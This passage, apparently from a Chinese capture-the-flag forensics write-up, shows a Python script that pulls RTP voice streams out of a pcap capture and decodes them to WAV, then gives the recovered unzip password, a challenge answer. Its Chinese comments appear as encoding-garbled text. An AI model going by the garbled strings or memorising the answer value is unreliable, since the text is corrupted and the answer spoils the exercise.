</span></span><span class="line"><span class="cl"><span class="n">counter_lock</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">process_packet_batch</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;å¤„ç†ä¸€æ‰¹æ•°æ®åŒ…&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">batch_id</span><span class="p">,</span> <span class="n">packets_batch</span> <span class="o">=</span> <span class="n">args</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">processed_counter</span><span class="p">,</span> <span class="n">rtp_counter</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">local_streams</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;packets&#39;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;payload_type&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;src_ip&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;dst_ip&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;src_port&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;dst_port&#39;</span><span class="p">:</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">local_rtp_count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">raw_packet</span> <span class="ow">in</span> <span class="n">packets_batch</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># è§£æUDPåŒ…</span>
</span></span><span class="line"><span class="cl">        <span class="n">udp_info</span> <span class="o">=</span> <span class="n">parse_ethernet_ip_udp</span><span class="p">(</span><span class="n">raw_packet</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">udp_info</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># è§£æRTP</span>
</span></span><span class="line"><span class="cl">        <span class="n">rtp_info</span> <span class="o">=</span> <span class="n">parse_rtp</span><span class="p">(</span><span class="n">udp_info</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">rtp_info</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">local_rtp_count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">ssrc</span> <span class="o">=</span> <span class="n">rtp_info</span><span class="p">[</span><span class="s1">&#39;ssrc&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># è®°å½•æµä¿¡æ¯</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">local_streams</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;payload_type&#39;</span><span class="p">]</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">local_streams</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;payload_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">rtp_info</span><span class="p">[</span><span class="s1">&#39;payload_type&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">local_streams</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;src_ip&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">udp_info</span><span class="p">[</span><span class="s1">&#39;src_ip&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">local_streams</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;dst_ip&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">udp_info</span><span class="p">[</span><span class="s1">&#39;dst_ip&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">local_streams</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;src_port&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">udp_info</span><span class="p">[</span><span class="s1">&#39;src_port&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">local_streams</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;dst_port&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">udp_info</span><span class="p">[</span><span class="s1">&#39;dst_port&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">local_streams</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;packets&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;sequence&#39;</span><span class="p">:</span> <span class="n">rtp_info</span><span class="p">[</span><span class="s1">&#39;sequence&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="n">rtp_info</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;payload&#39;</span><span class="p">:</span> <span class="n">rtp_info</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># æ›´æ–°å…¨å±€è®¡æ•°å™¨</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">counter_lock</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">processed_counter</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">packets_batch</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">rtp_counter</span> <span class="o">+=</span> <span class="n">local_rtp_count</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">processed_counter</span> <span class="o">%</span> <span class="mi">100000</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packets_batch</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] å·²å¤„ç† </span><span class="si">{</span><span class="n">processed_counter</span><span class="si">}</span><span class="s2"> ä¸ªåŒ…, æ‰¾åˆ° </span><span class="si">{</span><span class="n">rtp_counter</span><span class="si">}</span><span class="s2"> ä¸ªRTPåŒ…...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">dict</span><span class="p">(</span><span class="n">local_streams</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge_streams</span><span class="p">(</span><span class="n">all_results</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;åˆå¹¶æ‰€æœ‰çº¿ç¨‹çš„ç»“æœ&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">merged</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;packets&#39;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;payload_type&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;src_ip&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;dst_ip&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;src_port&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;dst_port&#39;</span><span class="p">:</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">all_results</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">ssrc</span><span class="p">,</span> <span class="n">stream_data</span> <span class="ow">in</span> <span class="n">result</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">merged</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;payload_type&#39;</span><span class="p">]</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merged</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;payload_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;payload_type&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="n">merged</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;src_ip&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;src_ip&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="n">merged</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;dst_ip&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;dst_ip&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="n">merged</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;src_port&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;src_port&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="n">merged</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;dst_port&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;dst_port&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">merged</span><span class="p">[</span><span class="n">ssrc</span><span class="p">][</span><span class="s1">&#39;packets&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;packets&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">dict</span><span class="p">(</span><span class="n">merged</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">processed_counter</span><span class="p">,</span> <span class="n">rtp_counter</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] æ­£åœ¨å¿«é€Ÿè¯»å– </span><span class="si">{</span><span class="n">PCAP_FILE</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">packets</span> <span class="o">=</span> <span class="n">read_pcap_raw</span><span class="p">(</span><span class="n">PCAP_FILE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">total_packets</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">packets</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] å·²è¯»å– </span><span class="si">{</span><span class="n">total_packets</span><span class="si">}</span><span class="s2"> ä¸ªæ•°æ®åŒ…åˆ°å†…å­˜&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] ä½¿ç”¨ </span><span class="si">{</span><span class="n">NUM_THREADS</span><span class="si">}</span><span class="s2"> ä¸ªçº¿ç¨‹å¹¶è¡Œå¤„ç†&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># å°†æ•°æ®åŒ…åˆ†æ‰¹</span>
</span></span><span class="line"><span class="cl">    <span class="n">batch_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">total_packets</span> <span class="o">+</span> <span class="n">NUM_THREADS</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="n">NUM_THREADS</span>
</span></span><span class="line"><span class="cl">    <span class="n">batches</span> <span class="o">=</span> <span class="p">[(</span><span class="n">i</span><span class="p">,</span> <span class="n">packets</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="n">batch_size</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">total_packets</span><span class="p">,</span> <span class="n">batch_size</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] åˆ†æˆ </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">batches</span><span class="p">)</span><span class="si">}</span><span class="s2"> æ‰¹ï¼Œæ¯æ‰¹çº¦ </span><span class="si">{</span><span class="n">batch_size</span><span class="si">}</span><span class="s2"> ä¸ªåŒ…&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] å¼€å§‹å¹¶è¡Œå¤„ç†...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># é‡ç½®è®¡æ•°å™¨</span>
</span></span><span class="line"><span class="cl">    <span class="n">processed_counter</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">rtp_counter</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># å¤šçº¿ç¨‹å¤„ç†</span>
</span></span><span class="line"><span class="cl">    <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="n">NUM_THREADS</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">futures</span> <span class="o">=</span> <span class="p">[</span><span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">process_packet_batch</span><span class="p">,</span> <span class="n">batch</span><span class="p">)</span> <span class="k">for</span> <span class="n">batch</span> <span class="ow">in</span> <span class="n">batches</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">future</span> <span class="ow">in</span> <span class="n">futures</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">future</span><span class="o">.</span><span class="n">result</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] åˆå¹¶ç»“æœ...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">streams</span> <span class="o">=</span> <span class="n">merge_streams</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] å¤„ç†å®Œæˆ!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] æ€»æ•°æ®åŒ…: </span><span class="si">{</span><span class="n">total_packets</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] RTPæ•°æ®åŒ…: </span><span class="si">{</span><span class="n">rtp_counter</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] è¯†åˆ«å‡º </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">streams</span><span class="p">)</span><span class="si">}</span><span class="s2"> ä¸ªRTPæµ</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># ä¿å­˜æ¯ä¸ªæµ</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="p">(</span><span class="n">ssrc</span><span class="p">,</span> <span class="n">stream_data</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">streams</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">packets_list</span> <span class="o">=</span> <span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;packets&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload_type</span> <span class="o">=</span> <span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;payload_type&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æŒ‰åºåˆ—å·æ’åº</span>
</span></span><span class="line"><span class="cl">        <span class="n">packets_list</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="s1">&#39;sequence&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;æµ #</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2"> - SSRC: 0x</span><span class="si">{</span><span class="n">ssrc</span><span class="si">:</span><span class="s2">08X</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  æ•°æ®åŒ…æ•°: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">packets_list</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  Payload Type: </span><span class="si">{</span><span class="n">payload_type</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  </span><span class="si">{</span><span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;src_ip&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;src_port&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> -&gt; &#34;</span>
</span></span><span class="line"><span class="cl">              <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;dst_ip&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">stream_data</span><span class="p">[</span><span class="s1">&#39;dst_port&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># ç¡®å®šç¼–ç </span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">payload_type</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">codec</span> <span class="o">=</span> <span class="s2">&#34;G.711 Î¼-law (PCMU)&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">needs_decode</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">payload_type</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">codec</span> <span class="o">=</span> <span class="s2">&#34;G.711 A-law (PCMA)&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">needs_decode</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">codec</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;æœªçŸ¥ (PT=</span><span class="si">{</span><span class="n">payload_type</span><span class="si">}</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">needs_decode</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  ç¼–ç : </span><span class="si">{</span><span class="n">codec</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># åˆå¹¶payload</span>
</span></span><span class="line"><span class="cl">        <span class="n">raw_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">packets_list</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># ä¿å­˜åŸå§‹æ•°æ®</span>
</span></span><span class="line"><span class="cl">        <span class="n">raw_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">OUTPUT_DIR</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;stream_</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">ssrc</span><span class="si">:</span><span class="s2">08X</span><span class="si">}</span><span class="s2">.raw&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">raw_file</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  åŸå§‹æ–‡ä»¶: </span><span class="si">{</span><span class="n">raw_file</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span><span class="si">}</span><span class="s2"> å­—èŠ‚)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># è§£ç å¹¶ä¿å­˜WAV</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">needs_decode</span> <span class="ow">and</span> <span class="n">payload_type</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">pcm_data</span> <span class="o">=</span> <span class="n">decode_mulaw_fast</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="n">wav_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">OUTPUT_DIR</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;stream_</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">ssrc</span><span class="si">:</span><span class="s2">08X</span><span class="si">}</span><span class="s2">.wav&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">with</span> <span class="n">wave</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">wav_file</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">wav</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">wav</span><span class="o">.</span><span class="n">setnchannels</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>      <span class="c1"># å•å£°é“</span>
</span></span><span class="line"><span class="cl">                    <span class="n">wav</span><span class="o">.</span><span class="n">setsampwidth</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>      <span class="c1"># 16-bit</span>
</span></span><span class="line"><span class="cl">                    <span class="n">wav</span><span class="o">.</span><span class="n">setframerate</span><span class="p">(</span><span class="mi">8000</span><span class="p">)</span>   <span class="c1"># 8kHz</span>
</span></span><span class="line"><span class="cl">                    <span class="n">wav</span><span class="o">.</span><span class="n">writeframes</span><span class="p">(</span><span class="n">pcm_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="n">duration</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">pcm_data</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="mi">8000</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  WAVæ–‡ä»¶: </span><span class="si">{</span><span class="n">wav_file</span><span class="si">}</span><span class="s2"> (æ—¶é•¿: </span><span class="si">{</span><span class="n">duration</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">ç§’)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  WAVè½¬æ¢å¤±è´¥: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] æ‰€æœ‰æ–‡ä»¶å·²ä¿å­˜åˆ°: </span><span class="si">{</span><span class="n">OUTPUT_DIR</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è„šæœ¬è§£å¯†å¾—åˆ°è§£å‹å¯†ç <code>5f3eb916bf08e610aeb09f60bc955bd8</code></p>
